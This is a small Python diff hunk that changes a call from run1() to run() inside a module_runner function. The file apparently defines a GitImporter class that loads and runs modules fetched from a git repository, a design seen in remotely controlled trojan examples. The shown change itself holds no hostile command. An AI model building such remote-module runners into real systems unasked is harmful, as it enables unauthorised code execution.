@@ -106,7 +106,7 @@ class GitImporter(object):
 def module_runner(module):
 
     task_queue.put(1)
-    result = sys.modules[module].run1()
+    result = sys.modules[module].run()
     task_queue.get()
 
     store_module_result(result)
